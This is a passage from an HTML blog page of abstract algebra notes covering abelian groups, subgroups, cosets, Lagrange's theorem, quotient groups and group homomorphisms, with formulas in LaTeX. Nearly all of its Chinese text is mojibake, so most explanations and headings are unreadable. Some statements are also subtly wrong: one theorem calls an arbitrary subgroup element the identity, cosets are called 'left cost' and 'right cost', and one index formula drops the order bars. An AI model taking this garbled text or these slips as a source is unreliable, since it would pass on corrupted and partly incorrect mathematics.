groupï¼‰</h2><p>åˆç§°<strong>äº¤æ¢ç¾¤</strong>(commutative group)</p><p><strong>å®šä¹‰ï¼š</strong>å¦‚æœå¯¹äºç¾¤$\mathbb{G}$ä¸­çš„ä»»æ„å…ƒç´ $a,b\in \mathbb{G}$,éƒ½æœ‰$a<em>b=b</em>a,$åˆ™ç§°$\mathbb{G}$ä¸ºé˜¿è´å°”ç¾¤ã€‚</p><p><strong>å®šç†</strong>ï¼šç¾¤$\mathbb{G}$æ˜¯é˜¿è´å°”ç¾¤ï¼Œå½“ä¸”ä»…å½“ï¼Œ$\forall a,b\in \mathbb{G}$,æœ‰$(a<em>b)^2=a^2</em>b^2$</p><p><strong>å®šç†</strong>ï¼šç¾¤$\mathbb{G}$æ˜¯é˜¿è´å°”ç¾¤ï¼Œ$\forall a,b\in \mathbb{G}$,æœ‰$(a<em>b)^t=a^t</em>b^t$</p><h3 id="ç¾¤çš„ç®€è®°ç¬¦å·"><a href="#ç¾¤çš„ç®€è®°ç¬¦å·" class="headerlink" title="ç¾¤çš„ç®€è®°ç¬¦å·"></a>ç¾¤çš„ç®€è®°ç¬¦å·</h3><p>tä¸ªaä¸€èµ·è¿ç®—ï¼Œç®€è®°ä¸º<script type="math/tex">a^t:a*a*\dots*a</script><br>å¹¶ä¸è¡¨ç¤ºtå’Œaä¹‹é—´çš„è¿ç®—ï¼Œtæ˜¯æ•´æ•°ï¼Œaæ˜¯ç¾¤é‡Œçš„å…ƒç´ </p><script type="math/tex; mode=display">a^{-t}: (a^{-1})^t=a^{-1}*a^{-1}*\cdots*a^{-1}</script><p>$(a^t)^m=a^{tm}$</p><p>$a^t*a^m=a^{t+m}$</p><p>$(a^{-1})^t=(a^t)^{-1}$</p><hr><h2 id="å­ç¾¤-subgroup"><a href="#å­ç¾¤-subgroup" class="headerlink" title="å­ç¾¤(subgroup)"></a>å­ç¾¤(subgroup)</h2><p><strong>å®šä¹‰</strong>ï¼šè®¾<script type="math/tex">(\mathbb{G},*)</script>æ˜¯ç¾¤ï¼Œ$\mathbb{H}$æ˜¯$\mathbb{G}$çš„éç©ºå­é›†ï¼Œå¦‚æœ<script type="math/tex">(\mathbb{H},*)</script>æ˜¯ä¸€ä¸ªç¾¤ï¼Œåˆ™ç§°<script type="math/tex">(\mathbb{H},*)</script>æ˜¯<script type="math/tex">(\mathbb{G},*)</script>çš„å­ç¾¤ã€‚</p><h3 id="mathbb-G-çš„å­ç¾¤"><a href="#mathbb-G-çš„å­ç¾¤" class="headerlink" title="$\mathbb{G}çš„å­ç¾¤$"></a>$\mathbb{G}çš„å­ç¾¤$</h3><p>å¹³å‡¡å­ç¾¤ï¼š<script type="math/tex">(\{e\},*)ã€(\mathbb{G},*)</script><br>éå¹³å‡¡å­ç¾¤ï¼š<script type="math/tex">(\mathbb{H},*)</script> ä¸” $\mathbb{H}\neq { e} , G$ (åˆç§°çœŸå­ç¾¤)</p><p>é˜¿è´å°”ç¾¤çš„å­ç¾¤ä¹Ÿä¸€å®šæ˜¯é˜¿è´å°”ç¾¤</p><h3 id="å­ç¾¤çš„å•ä½å…ƒ"><a href="#å­ç¾¤çš„å•ä½å…ƒ" class="headerlink" title="å­ç¾¤çš„å•ä½å…ƒ"></a>å­ç¾¤çš„å•ä½å…ƒ</h3><p><strong>å®šç†</strong>ï¼š$\mathbb{H}$æ˜¯ç¾¤$\mathbb{G}$çš„å­ç¾¤ï¼Œ$e\in \mathbb{G}$æ˜¯å•ä½å…ƒï¼Œåˆ™$e$ ä¹Ÿæ˜¯å­ç¾¤$\mathbb{H}$çš„å•ä½å…ƒã€‚(<strong>çœæµï¼šç¾¤çš„å•ä½å…ƒä¹Ÿæ˜¯å…¶å­ç¾¤çš„å•ä½å…ƒ</strong>)</p><h3 id="å­ç¾¤çš„é€†å…ƒ"><a href="#å­ç¾¤çš„é€†å…ƒ" class="headerlink" title="å­ç¾¤çš„é€†å…ƒ"></a>å­ç¾¤çš„é€†å…ƒ</h3><p><strong>å®šç†</strong>ï¼š$\mathbb{H}$æ˜¯ç¾¤$\mathbb{G}$çš„å­ç¾¤ï¼Œ$a\in \mathbb{H}$æ˜¯å•ä½å…ƒï¼Œ,åˆ™ $a^{-1}\in \mathbb{H}$(<strong>çœæµ:å…ƒç´ åœ¨å­ç¾¤ä¸­,å…¶é€†å…ƒä¹Ÿå¿…åœ¨è¯¥å­ç¾¤ä¸­</strong>)</p><h3 id="åˆ¤æ–­å­ç¾¤"><a href="#åˆ¤æ–­å­ç¾¤" class="headerlink" title="åˆ¤æ–­å­ç¾¤"></a>åˆ¤æ–­å­ç¾¤</h3><p><strong>åˆ¤æ–­å­ç¾¤(1)</strong></p><p><strong>å®šç†</strong>ï¼š$\mathbb{H}$æ˜¯ç¾¤$\mathbb{G}$çš„éç©ºå­é›†ï¼Œå¯¹äºä»»æ„ $a,b\in \mathbb{H}$,éƒ½æœ‰ <script type="math/tex">a*b^{-1}\in \mathbb{H}</script>,åˆ™$\mathbb{H}$æ˜¯<script type="math/tex">\mathbb{G}</script>çš„å­ç¾¤ã€‚</p><p><strong>åˆ¤æ–­å­ç¾¤(2)</strong></p><p><strong>å®šç†</strong>ï¼š$\mathbb{H}$æ˜¯ç¾¤$\mathbb{G}$çš„éç©ºå­é›†ï¼Œå¦‚æœ$\mathbb{H}$æ˜¯æœ‰é™é›†ï¼Œè€Œä¸”$\mathbb{G}$çš„è¿ç®—<em>åœ¨$\mathbb{H}$ä¸Šæ»¡è¶³å°é—­æ€§ï¼Œåˆ™$\mathbb{H}$æ˜¯$\mathbb{G}$çš„å­ç¾¤ã€‚(<em>*çœæµï¼š$\mathbb{H}$æ˜¯æœ‰é™é›†ã€å°é—­ï¼Œä¾¿æ˜¯å­ç¾¤</em></em>)</p><h3 id="æ„é€ å­ç¾¤"><a href="#æ„é€ å­ç¾¤" class="headerlink" title="æ„é€ å­ç¾¤"></a>æ„é€ å­ç¾¤</h3><p><strong>æ–¹æ³•1</strong></p><p><strong>å®šç†</strong>ï¼š$\mathbb{G}$æ˜¯é˜¿è´å°”ç¾¤ï¼Œ$m\in\mathbb{Z}$,<br>åˆ™$\mathbb{G}^m:={a^m\mid a\in \mathbb{G}}$æ˜¯$\mathbb{G}$çš„å­ç¾¤ã€‚</p><script type="math/tex; mode=display">\mathbb{(Z_n^{*}})^2æ˜¯\mathbb{Z_n^{*}}çš„å­ç¾¤</script><script type="math/tex; mode=display">\mathbb{(Z_n^{*}})^mæ˜¯\mathbb{Z_n^{*}}çš„å­ç¾¤</script><p><strong>æ–¹æ³•2</strong></p><p><strong>å®šç†</strong>ï¼š$\mathbb{G}$æ˜¯é˜¿è´å°”ç¾¤ï¼Œ$m\in\mathbb{Z}$,<br>åˆ™$\mathbb{G}{m}:={a\in \mathbb{G}\mid a^m=e}$æ˜¯$\mathbb{G}$çš„å­ç¾¤ã€‚</p><blockquote><p>ä¾‹:$\mathbb{Z_n}{m}=\mathbb{Z_n}{d}=\frac nd\mathbb{Z_n}\quad d=gcd(m,n),ä¸”æ„é€ çš„å­ç¾¤åªæœ‰dä¸ªå…ƒç´ $</p></blockquote><p><strong>æ–¹æ³•3</strong></p><p><strong>å®šç†</strong>ï¼š<script type="math/tex">\begin{aligned}&\text{è®¾}G\text{æ˜¯ç¾¤,}a\in G\text{,åˆ™}\\&<a>:=\{a^z\mid z\in Z\}\text{æ˜¯ç”±}a\text{ç”Ÿæˆçš„}G\text{çš„å­ç¾¤ã€‚}\end{aligned}</script></p><h4 id="å­ç¾¤æ„é€ å­ç¾¤"><a href="#å­ç¾¤æ„é€ å­ç¾¤" class="headerlink" title="å­ç¾¤æ„é€ å­ç¾¤"></a>å­ç¾¤æ„é€ å­ç¾¤</h4><p><strong>å®šç†1</strong>ï¼š$\mathbb{H}_1$å’Œ$\mathbb{H}_2$æ˜¯é˜¿è´å°”ç¾¤$\mathbb{G}$çš„å­ç¾¤ï¼Œåˆ™$\mathbb{H}:=\mathbb{H}_1\mathbb{H}_2$ä¹Ÿæ˜¯$G$çš„å­ç¾¤ã€‚<br>$H:=\mathbb{H}_1\mathbb{H}_2:={a_1*a_2|a_1\in \mathbb{H}_1,a_2\in \mathbb{H}_2}$</p><p><strong>æ‰©å±•</strong>ï¼šä»¥ä¸Šå®šç†ä¸­çš„2ä¸ªå­ç¾¤æ‰©å±•è‡³<strong>ä»»æ„å¤šä¸ªå­ç¾¤</strong>ï¼Œç»“è®ºä¾ç„¶æˆç«‹</p><hr><p><strong>å®šç†2</strong>ï¼š$\mathbb{H}_1$å’Œ$\mathbb{H}_2$æ˜¯ç¾¤$\mathbb{G}$çš„å­ç¾¤ï¼Œåˆ™$\mathbb{H}:=\mathbb{H}_1\cap \mathbb{H}_2$<br>ä¹Ÿæ˜¯$\mathbb{G}$çš„å­ç¾¤ã€‚(çœæµï¼šå­ç¾¤çš„äº¤é›†æ˜¯å­ç¾¤)<br>$\mathbb{H}:=\mathbb{H}_1\cap \mathbb{H}_2:={a\mid a\in \mathbb{H}_1,a\in \mathbb{H}_2}$</p><p><strong>æ‰©å±•</strong>ï¼šä»¥ä¸Šå®šç†ä¸­çš„2ä¸ªå­ç¾¤æ‰©å±•è‡³<strong>ä»»æ„å¤šä¸ªå­ç¾¤</strong>ï¼Œç»“è®ºä¾ç„¶æˆç«‹</p><hr><p><strong>å­ç¾¤çš„å¹¶é›†æœªå¿…æ˜¯å­ç¾¤</strong></p><p><strong>å®šç†3</strong>ï¼š$\mathbb{H}_1$å’Œ$\mathbb{H}_2$æ˜¯ç¾¤$\mathbb{G}$çš„éå¹³å‡¡å­ç¾¤ï¼Œ</p><p>â€‹                åˆ™$\mathbb{G}:\neq\mathbb{H}_1\cup \mathbb{H}_2$</p><h3 id="æ•´æ•°ç¾¤çš„å­ç¾¤"><a href="#æ•´æ•°ç¾¤çš„å­ç¾¤" class="headerlink" title="æ•´æ•°ç¾¤çš„å­ç¾¤"></a>æ•´æ•°ç¾¤çš„å­ç¾¤</h3><p><strong>å®šç†1</strong>ï¼š$\mathbb{H}$æ˜¯$\mathbb{Z}$çš„å­ç¾¤ï¼Œåˆ™å­˜åœ¨å”¯ä¸€çš„éè´Ÿæ•´æ•° $m$,ä½¿å¾—$\mathbb{H}=\boldsymbol{m}\mathbb{Z}$</p><script type="math/tex; mode=display">\begin{aligned}m \mathbb{Z}&:=\{mz\mid z\in\mathbb{Z}\}\\&=\{0,\pm m,\pm2m,...\}\end{aligned}</script><p><strong>å®šç†2</strong>ï¼š$m_1å’Œm_2\text{æ˜¯éè´Ÿæ•´æ•°,åˆ™ }m_2|m_1\text{,å½“ä¸”}ä»…å½“,m_1\mathbb{Z}\subseteq m_2\mathbb{Z}ã€‚$</p><p><strong>å®šç†3</strong>ï¼š</p><script type="math/tex; mode=display">\mathbb{H}æ˜¯\mathbb{Z_n}çš„å­ç¾¤,\\ 1.å­˜åœ¨nçš„å”¯ä¸€æ­£å› å­ m,ä½¿å¾—H=m\mathbb{Z_n}.\ \\xä¸æ˜¯nçš„å› å­ \Rightarrow x\mathbb{Z_n}=m\mathbb{Z_n},\quad\exists m\mid n.\ \\2.m_1å’Œm_2æ˜¯nçš„æ­£å› å­,åˆ™ m_2|m_1,å½“ä¸”ä»…å½“,m_1\mathbb{Z}\subseteq m_2\mathbb{Z}ã€‚</script><h3 id="æ­£è§„å­ç¾¤-normal-subgroup"><a href="#æ­£è§„å­ç¾¤-normal-subgroup" class="headerlink" title="æ­£è§„å­ç¾¤(normal subgroup)"></a>æ­£è§„å­ç¾¤(normal subgroup)</h3><p><strong>å®šä¹‰</strong>ï¼š$è®¾\mathbb{N}æ˜¯ç¾¤\mathbb{G}çš„å­ç¾¤ï¼Œå¦‚æœå¯¹äº\forall a\in \mathbb{G},éƒ½æœ‰a\mathbb{N}=\mathbb{N}a,ç§°\mathbb{N}ä¸º\mathbb{G}çš„æ­£è§„å­ç¾¤$</p><p>é˜¿è´å°”ç¾¤çš„å­ç¾¤éƒ½æ˜¯æ­£è§„å­ç¾¤</p><blockquote><p>ç°åœ¨ä¸æ‡‚æ²¡å…³ç³»ï¼Œå¾€ä¸‹ä½ å°±çŸ¥é“äº†ï¼š<strong>æ­£è§„å­ç¾¤æœ¬èº«æ˜¯å•†ç¾¤çš„ä¸€ä¸ªå…ƒç´ ï¼Œå«ä½œå¹³å‡¡é™ªé›†ï¼ŒåŒ…å«ç¾¤çš„å•ä½å…ƒï¼Œæœ¬èº«è¿˜æ˜¯å•†ç¾¤çš„å•ä½å…ƒï¼Œè¢«åˆ†ç±»åˆ°Nçš„å…ƒç´ ï¼Œå¿…ç„¶æ˜¯åŒæ€æ ¸é‡Œçš„å…ƒç´ ï¼Œè‡ªç„¶æ˜ å°„çš„åŒæ€æ ¸å°±æ˜¯æ­£è§„å­ç¾¤N</strong></p></blockquote><hr><h2 id="é™ªé›†-coset"><a href="#é™ªé›†-coset" class="headerlink" title="é™ªé›†(coset)"></a>é™ªé›†(coset)</h2><p>å®šä¹‰ï¼š$\mathbb{H}$ æ˜¯ç¾¤$\mathbb{G}$çš„å­ç¾¤ï¼Œ$a\in \mathbb{G}$,åˆ™</p><script type="math/tex; mode=display">a\mathbb{H}:=\{a*h|h\in \mathbb{H}\}</script><p>ç§°ä¸º $\mathbb{H}$ å…³äº$a$åœ¨$\mathbb{G}$ä¸­çš„å·¦é™ªé›† (left cost)ã€‚åŒç†ï¼Œ</p><script type="math/tex; mode=display">\mathbb{H}a:=\{h*a|h\in \mathbb{H}\}</script><p>ç§°ä¸º $\mathbb{H}$ å…³äº$a$åœ¨$\mathbb{G}$ä¸­çš„å³é™ªé›† (right cost)ã€‚</p><p>é™ªé›†ï¼š$[a]_\mathbb{H}$<br>å·¦é™ªé›†ï¼š$a\mathbb{H}$<br>å³é™ªé›†ï¼š$\mathbb{H}a$</p><p><strong>å·¦å³é™ªé›†ç›¸ç­‰ä¸èƒ½è¯´æ˜æ»¡è¶³äº¤æ¢å¾‹ï¼Œåªèƒ½è¯´æ˜å¯¹äºå³é™ªé›†çš„ä¸€ä¸ªå…ƒç´ å­˜åœ¨å·¦é™ªé›†çš„ä¸€ä¸ªå…ƒç´ ä½¿å¾—ä¸¤è€…ç›¸ç­‰</strong></p><p>$b=a<em>hæˆ–a=b</em>hï¼Œ\exist h\in \mathbb{H}\a,bä¼šè¢«åˆ†ç±»åˆ°åŒä¸€ä¸ªé™ªé›†$</p><p>$a\equiv b \pmod {\mathbb{H}}:aå’Œbåœ¨åŒä¸€ä¸ª(ç”±\mathbb{H}æ„é€ çš„)é™ªé›†é‡Œ$</p><p>$\iff b\equiv a\pmod{\mathbb{H}}$</p><p>$\iff b \equiv a*h,\exist\ h\in \mathbb{H}$</p><p>$\iff b\in [a]_{\mathbb{H}}$</p><p>$\iff [a]_\mathbb{H}=[b]_\mathbb{H}$</p><h3 id="æ€§è´¨"><a href="#æ€§è´¨" class="headerlink" title="æ€§è´¨"></a>æ€§è´¨</h3><ul><li>$a\in [a]_\mathbb{H}$</li><li>$[e]_\mathbb{H}=\mathbb{H}(å¹³å‡¡é™ªé›†)$</li><li>$a\in \mathbb{H}\iff[a]_\mathbb{H}=\mathbb{H}$</li><li><script type="math/tex; mode=display">[a]_\mathbb{H}=[b]_\mathbb{H}\Leftrightarrow a^{-1}*b\in \mathbb{H}\text{ (æˆ– }b^{-1}*a\in \mathbb{H})</script></li></ul><p>$a\equiv b\pmod {\mathbb{H}}:aå’Œbåœ¨åŒä¸€ä¸ª(ç”±\mathbb{H}æ„é€ çš„)é™ªé›†é‡Œ\\iff b=a*h,\exists h\in \mathbb{H}\\iff b\in [a]_\mathbb{H}$</p><script type="math/tex; mode=display">\begin{aligned}\ [a]_{n\mathbb{Z}}& =\{b\in \mathbb{Z}\mid b\equiv a\pmod{n}\} \\&=\{b\in \mathbb{Z}\mid b=a+nz,z\in \mathbb{Z}\} \\&=\{b\in \mathbb{Z}\mid b\equiv a\pmod{n}\} \\&=[a],[a]\in\mathbb{Z}_n\end{aligned}</script><p>$Â·\equiv Â·\pmod {\mathbb{H}}æ˜¯ç­‰ä»·å…³ç³»$</p><ul><li>è‡ªåæ€§</li><li>å¯¹ç§°æ€§</li><li>ä¼ é€’æ€§</li></ul><p><strong>æ€§è´¨</strong>ï¼šä»»æ„ä¸¤ä¸ªé™ªé›†$[a]_\mathbb{H}$å’Œ$[b]_\mathbb{H}$ä¹‹é—´å­˜åœ¨åŒå°„ï¼Œä»»æ„é™ªé›†$[a]_\mathbb{H}$å’Œå­ç¾¤$\mathbb{H}$æ˜¯ç­‰åŠ¿çš„</p><h3 id="é˜¿è´å°”ç¾¤çš„é™ªé›†"><a href="#é˜¿è´å°”ç¾¤çš„é™ªé›†" class="headerlink" title="é˜¿è´å°”ç¾¤çš„é™ªé›†"></a>é˜¿è´å°”ç¾¤çš„é™ªé›†</h3><p><strong>æ€§è´¨1</strong>ï¼š$\mathbb{H}æ˜¯é˜¿è´å°”ç¾¤\mathbb{G}çš„å­ç¾¤ï¼Œå¯¹äº\forall a\in \mathbb{G}ï¼Œæœ‰a\mathbb{H}=\mathbb{H}a\ ([a]_\mathbb{H})$</p><p>æ³¨æ„ï¼š$å¦‚æœå¯¹äº\forall a,éƒ½æœ‰a\mathbb{H}=\mathbb{H}a,åˆ™\mathbb{G}æœªå¿…æ˜¯é˜¿è´å°”ç¾¤$</p><p><strong>æ€§è´¨2</strong>ï¼šé˜¿è´å°”ç¾¤çš„å­ç¾¤éƒ½æ˜¯æ­£è§„å­ç¾¤<br><strong>æ€§è´¨3</strong>ï¼šé˜¿è´å°”ç¾¤çš„ä»»æ„å­ç¾¤éƒ½å¯ä»¥æ„é€ å•†ç¾¤<br><strong>æ€§è´¨4</strong>ï¼šé˜¿è´å°”ç¾¤çš„å­ç¾¤æ„é€ çš„å•†ç¾¤ä¹Ÿæ˜¯é˜¿è´å°”ç¾¤</p><hr><h2 id="æ‹‰æ ¼æœ—æ—¥å®šç†"><a href="#æ‹‰æ ¼æœ—æ—¥å®šç†" class="headerlink" title="æ‹‰æ ¼æœ—æ—¥å®šç†"></a>æ‹‰æ ¼æœ—æ—¥å®šç†</h2><p><strong>å®šç†</strong>ï¼š$\mathbb{G}æ˜¯æœ‰é™ç¾¤ï¼Œ\mathbb{H}æ˜¯\mathbb{G}çš„ä»»æ„å­ç¾¤ï¼Œ\åˆ™|\mathbb{H}|\mid|\mathbb{G}|$</p><p>$\begin{aligned}&amp;\text{è¯æ˜:è®¾}\mathbb{H}\text{æ„é€ çš„é™ªé›†ä¸º}[a_1]_\mathbb{H},â€¦,[a_n]_\mathbb{H}\text{,å®ƒä»¬æ˜¯}\mathbb{G}\text{çš„}\&amp;\text{åˆ’åˆ†ã€‚æ‰€ä»¥,}|\mathbb{G}|=\sum_{i=1}^n|[a_i]_\mathbb{H}|=\sum_{i=1}^n|\mathbb{H}|=n|\mathbb{H}|\end{aligned}$</p><hr><h2 id="å•†ç¾¤"><a href="#å•†ç¾¤" class="headerlink" title="å•†ç¾¤"></a>å•†ç¾¤</h2><p><strong>å®šä¹‰</strong>ï¼š$ç¾¤(\mathbb{G}/\mathbb{N},*):ç¾¤\mathbb{G}åœ¨æ¨¡\mathbb{N}ä¸‹çš„å•†ç¾¤$</p><p>$é›†åˆ\mathbb{G}/\mathbb{N}={[a]_\mathbb{N}|a\in \mathbb{G}}$</p><p>$\mathbb{N}ä¸ºæ­£è§„å­ç¾¤ï¼Œæ­£è§„å­ç¾¤æ˜¯å•¥ï¼Ÿå¾€ä¸Šç¿»ğŸ˜¾$</p><script type="math/tex; mode=display">äºŒå…ƒè¿ç®—[a]_\mathbb{N}*[b]_\mathbb{N}=[a*b]_\mathbb{N}</script><p>æ­£è§„å­ç¾¤æ˜¯å…¶ä¸­çš„<strong>å¹³å‡¡é™ªé›†</strong>ï¼Œå•†ç¾¤é‡ç‚¹å…³æ³¨å…¶ä¸­çš„éå¹³å‡¡é™ªé›†ï¼Œå…ƒç´ ä¸å±äºæ­£è§„å­ç¾¤</p><p>æ•´æ•°ç¾¤$\mathbb{Z}={0,\pm1,\pm2,â€¦}$</p><p>å­ç¾¤$n\mathbb{Z}={0,\pm n,\pm2n,â€¦}$</p><p>å•†ç¾¤$\mathbb{Z}/ n\mathbb{Z}:$ </p><p>$[ 0] _{n\mathbb{Z}}= { 0, \pm n, \pm 2n, . . . }=[0]$<br>$[1]_{n\mathbb{Z}}={1,1\pm n,1\pm2n,â€¦}=[1]$<br>$[2]_{n\mathbb{Z}}={2,2\pm n,2\pm2n,â€¦}=[2]$<br>$\dots$<br>$[n-1]_{n\mathbb{Z}}={n-1,(n-1)\pm n,â€¦}=[n-1]$<br>$[n]_{n\mathbb{Z}}={n,n\pm n,n\pm2nâ€¦}=[0]$<br>$[n+1]_{n\mathbb{Z}}={n+1,(n+1)\pm n,â€¦}=[1]$</p><p>$\dots$</p><p>$\mathbb{Z}/ n\mathbb{Z}={[0],[1],\dots \,[n-1]}=\mathbb{Z_n}$</p><p>åœ¨æ•´æ•°ç¾¤é‡Œï¼Œ<strong>é™ªé›†</strong>å’Œ<strong>å‰©ä½™ç±»</strong>æœ¬è´¨ä¸Šæ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œéƒ½æ˜¯åœ¨ç­‰ä»·å…³ç³»ä¸Šå½¢æˆçš„ç­‰ä»·ç±»</p><h3 id="å•†ç¾¤çš„é˜¶"><a href="#å•†ç¾¤çš„é˜¶" class="headerlink" title="å•†ç¾¤çš„é˜¶"></a>å•†ç¾¤çš„é˜¶</h3><p>$[\mathbb{G}:\mathbb{N}]å•†ç¾¤\mathbb{G}/\mathbb{N}çš„é˜¶$</p><p><strong>å®šç†1</strong>ï¼š$\mathbb{G}æ˜¯æœ‰é™ç¾¤ï¼Œ\mathbb{N}æ˜¯\mathbb{G}çš„æ­£è§„å­ç¾¤ï¼Œ[\mathbb{G}:\mathbb{N}]=\frac{\mathbb{G}}{\mathbb{N}}$</p><p><strong>å®šç†2</strong>ï¼š$\mathbb{G}æ˜¯æœ‰é™ç¾¤ï¼Œ\mathbb{N}æ˜¯\mathbb{G}çš„æ­£è§„å­ç¾¤ï¼Œ\mathbb{K}æ˜¯\mathbb{N}çš„æ­£è§„å­ç¾¤ï¼Œ[\mathbb{G}:\mathbb{K}]=[\mathbb{G}:\mathbb{N}][\mathbb{N}:\mathbb{K}]$</p><hr><h2 id="ç¾¤åŒæ€-group-homomorphism-åå­—å¯çˆ±æğŸ˜¸"><a href="#ç¾¤åŒæ€-group-homomorphism-åå­—å¯çˆ±æğŸ˜¸" class="headerlink" title="ç¾¤åŒæ€(group homomorphism,åå­—å¯çˆ±æğŸ˜¸)"></a>ç¾¤åŒæ€(group homomorphism,åå­—å¯çˆ±æğŸ˜¸)</h2><p><strong>å®šä¹‰</strong>ï¼šè®¾ç¾¤$(\mathbb{G},*)$å’Œç¾¤$(\mathbb{G}^\prime,\otimes)$,å¦‚æœå‡½æ•° $f:\mathbb{G}\to \mathbb{G}^\prime$ å¯¹äº</p><p>$\forall\boldsymbol{a},b\in \mathbb{G}$ ,éƒ½æœ‰</p><p>$f(a*b)=f(a)\otimes f(b),$</p><p>$f$ä¸º$(\mathbb{G},*)$åˆ°$(\mathbb{G}^\prime,\otimes)$çš„ç¾¤åŒæ€ã€‚</p><h3 id="æ€§è´¨-1"><a href="#æ€§è´¨-1" class="headerlink" title="æ€§è´¨"></a>æ€§è´¨</h3><p>1.$f(e)=e^{\prime}\ (eå’Œe^{\prime}åˆ†åˆ«æ˜¯ç¾¤Gå’ŒG^{\prime}çš„å•ä½å…ƒ)$</p><p>2.$f(a^{-1})=f(a)^{-1},\quad\forall a\in G$</p><p>3.$Hæ˜¯Gçš„å­ç¾¤\Longrightarrow f(H)æ˜¯G^{\prime}çš„å­ç¾¤$<br>æ‰©å±•ï¼š$H=G,\Rightarrow f(G)=Imf$</p><p>4.$H^{\prime}æ˜¯G^{\prime}çš„å­ç¾¤\Rightarrow f^{-1}(H^{\prime})æ˜¯Gçš„å­ç¾¤$<br>æ‰©å±•ï¼š$H^{\prime}={e^{\prime}}$</p><p>5.$f(a^m)=f(a)^m,\quad\forall a\in G,\forall m\in \mathbb{Z}$</p><h3 id="åŒæ€åƒ-homomorphic-image"><a href="#åŒæ€åƒ-homomorphic-image" class="headerlink" title="åŒæ€åƒ(homomorphic image)"></a>åŒæ€åƒ(homomorphic image)</h3><p>$f:\mathbb{G}\to \mathbb{G}^\prime$ </p><p><strong>åŒæ€åƒ</strong>$ Imf:=f(G):={f(a)|a\in G},(åŒæ€åƒImfæ˜¯G^{\prime}çš„å­ç¾¤)$</p><h3 id="åŒæ€æ ¸"><a href="#åŒæ€æ ¸" class="headerlink" title="åŒæ€æ ¸"></a>åŒæ€æ ¸</h3><p><strong>åŒæ€æ ¸</strong>$Kerf:={a\in G|f(a)=e^{\prime}},(åŒæ€æ ¸Kerfæ˜¯Gçš„å­ç¾¤)$</p><p>$(e^{\prime}$è¡¨ç¤º$G^\prime$çš„å•ä½å…ƒ)</p><p><strong>å®šç†</strong>ï¼š$f{:}G\to G^{\prime}\text{ æ˜¯ç¾¤åŒæ€,åˆ™Ker }f\text{æ˜¯æ­£è§„å­ç¾¤}$</p><h3 id="ç¾¤åŒæ€çš„å¤åˆ"><a href="#ç¾¤åŒæ€çš„å¤åˆ" class="headerlink" title="ç¾¤åŒæ€çš„å¤åˆ"></a>ç¾¤åŒæ€çš„å¤åˆ</h3><p><strong>å®šç†</strong>ï¼š$f$æ˜¯$(G,*)$åˆ°$(G^\prime,\otimes)$çš„ç¾¤åŒæ€ï¼Œ$f^\prime$æ˜¯$(G^\prime,\otimes)$åˆ°$(G^{\prime\prime}$,ç”°)çš„ç¾¤åŒæ€ï¼Œåˆ™$f$å’Œ$f^\prime$çš„å¤åˆ</p><script type="math/tex; mode=display">f^{\prime}\circ f{:}G\to G^{\prime\prime}$$ä¹Ÿæ˜¯ç¾¤åŒæ€### åˆ¤æ–­å•ä¸€åŒæ€**å®šç†1**ï¼š$$f: G\to G^{\prime}æ˜¯ç¾¤åŒæ€,\forall a,b\in G,æœ‰\\f(a)=f(b)\Leftrightarrow a\equiv b\pmod {Ker f}</script><p><strong>å®šç†2</strong>ï¼š</p><script type="math/tex; mode=display">f: G\to G^{\prime}æ˜¯ç¾¤åŒæ€,æœ‰\\fæ˜¯å•å°„ \Longleftrightarrow Kerf=\{e\}</script><h3 id="åˆ¤æ–­æ»¡åŒæ€"><a href="#åˆ¤æ–­æ»¡åŒæ€" class="headerlink" title="åˆ¤æ–­æ»¡åŒæ€"></a>åˆ¤æ–­æ»¡åŒæ€</h3><p>$f\text{æ˜¯æ»¡åŒæ€}\Leftrightarrow Imf=G^{\prime}$</p><h3 id="åµŒå…¥æ˜ å°„-inclusion-map"><a href="#åµŒå…¥æ˜ å°„-inclusion-map" class="headerlink" title="åµŒå…¥æ˜ å°„(inclusion map)"></a>åµŒå…¥æ˜ å°„(inclusion map)</h3><p>$H \to G$</p><p>$a\to f(a)=a$</p><p>å­ç¾¤å…ƒç´ ç›´æ¥æ˜ å°„åˆ°è‡ªèº«</p><p>å­ç¾¤åˆ°ç¾¤çš„åµŒå…¥æ˜ å°„æ˜¯ä¸ªç¾¤åŒæ€<br>åŸåƒå’Œåƒä¹‹é—´æ˜¯ä¸€å¯¹ä¸€çš„ï¼Œå•å°„</p><p><strong>å•ä¸€åŒæ€ï¼š$f$æ˜¯å•å°„</strong></p><h3 id="è‡ªç„¶æ˜ å°„-natural-map"><a href="#è‡ªç„¶æ˜ å°„-natural-map" class="headerlink" title="è‡ªç„¶æ˜ å°„(natural map)"></a>è‡ªç„¶æ˜ å°„(natural map)</h3><p>$G \to G/N,(Næ˜¯Gçš„æ­£è§„å­ç¾¤)$</p><p>$a\to f(a)=[a]_N$</p><p><strong>è‡ªç„¶æ˜ å°„çš„åŒæ€æ ¸å°±æ˜¯æ­£è§„å­ç¾¤N</strong></p><p><strong>æ»¡åŒæ€ï¼š$f$æ˜¯æ»¡å°„</strong></p><h3 id="mæ¬¡æ–¹æ˜ å°„-m-power-map"><a href="#mæ¬¡æ–¹æ˜ å°„-m-power-map" class="headerlink" title="mæ¬¡æ–¹æ˜ å°„(m-power map)"></a>mæ¬¡æ–¹æ˜ å°„(m-power map)</h3><p>$Gæ˜¯é˜¿è´å°”ç¾¤$</p><p>$G \to G$</p><p>$a\to f(a)=a^m$</p><p>$Imf=G^m$</p><p>$Kerf=G{m}$</p><h3 id="é›…å¯æ¯”æ˜ å°„-Jacobi-map"><a href="#é›…å¯æ¯”æ˜ å°„-Jacobi-map" class="headerlink" title="é›…å¯æ¯”æ˜ å°„(Jacobi map)"></a>é›…å¯æ¯”æ˜ å°„(Jacobi map)</h3><p>$\mathbb{Z}_n^* \to {\pm 1}$</p><p>$a\to J_n(a)=(\frac an)$</p><hr><h2 id="ç¾¤åŒæ„-group-isomorphism"><a href="#ç¾¤åŒæ„-group-isomorphism" class="headerlink" title="ç¾¤åŒæ„(group isomorphism)"></a>ç¾¤åŒæ„(group isomorphism)</h2><ul><li><p><strong>åŒå°„(å•å°„&amp;æ»¡å°„)</strong></p></li><li><p><strong>ç¾¤åŒæ€</strong></p></li></ul><p>$G$ä¸$G^\prime$åŒæ„ï¼Œè®°ä¸º$G\cong G^\prime$<br>$G$ä¸$G$ä¹‹é—´çš„åŒæ„ï¼šè‡ªåŒæ„(group automorphism)</p><h3 id="ç¬¬ä¸€åŒæ„å®šç†-first-isomorphism-theorem"><a href="#ç¬¬ä¸€åŒæ„å®šç†-first-isomorphism-theorem" class="headerlink" title="ç¬¬ä¸€åŒæ„å®šç†(first isomorphism 